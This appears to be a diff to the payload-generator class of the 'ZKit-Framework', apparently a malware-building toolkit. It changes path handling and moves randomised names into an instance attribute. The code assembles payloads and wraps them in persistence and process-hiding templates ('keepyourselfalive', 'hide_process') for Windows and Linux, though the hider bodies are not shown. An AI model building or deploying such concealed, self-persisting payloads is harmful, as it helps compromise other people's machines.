@@ -44,9 +44,9 @@ def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
         """
         self._IMPORTS = "import socket,os,sys\n"
         self.root = root
-        self.root.replace("/", "\\")
+        self.root.replace("\\", "/")
         if not self.root.endswith(('\\', "/")):
-            self.root += "\\"
+            self.root += "/"
         self.CONFIG_FILE = path.abspath(self.root + CONFIG_FILE)
         self.CONFIG_FILE_EX = path.abspath(self.root + CONFIG_FILE_EX)
         self.info = self.load_info(self.CONFIG_FILE)
@@ -54,7 +54,7 @@ def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
         self.payloads = {}
         for payload in self.info['payloads']:
             self.payloads[payload] = imp(
-                "." + payload, self.root.replace(sys.path[0], '').replace('\\', '.')[1:-1])
+                "." + payload, self.root.replace(sys.path[0].replace('\\', '/'), '').replace('/', '.')[1:-1])
 
     def get_random_strs(self, size=4, count=7):
         return [random_str(size) for _ in range(count)]
@@ -68,13 +68,13 @@ def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
                                      f"your zkit-framework version is {version}"
                                      "Please consider upgrading your ZKit-Framework using updater.py")
 
-    def _handle_levels(self, payload: str, level: str, platform: str, strs):
+    def _handle_levels(self, payload: str, level: str, platform: str):
         if level.lower() == "basic":
             # User wants zkit to handle hiding
             if platform.lower() == "windows":
-                hider = self._WINDOWS_HIDER.format(keepyourselfalive=strs[0])
+                hider = self._WINDOWS_HIDER.format(keepyourselfalive=self.strs[0])
             elif platform.lower() == "linux":
-                hider = self._LINUX_HIDER.format(hide_process=strs[0])
+                hider = self._LINUX_HIDER.format(hide_process=self.strs[0])
             else:
                 print("The payload platform is not supported and level is basic ."
                       "if your payloads are for windows linux name them windows.py , linux.py"
@@ -107,9 +107,9 @@ def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
         else:
             choice = list(self.payloads.keys())[0]
 
-        strs = self.get_random_strs()
-        payload = self.payloads[choice].Payload(*data, strs[1:]).create()
-        payload = self._handle_levels(payload, info['level'], choice, strs)
+        self.strs = self.get_random_strs()
+        payload = self.payloads[choice].Payload(*data, self.strs[1:]).create()
+        payload = self._handle_levels(payload, info['level'], choice)
 
         # sweet now payload is generated . lets return the result
         return payload
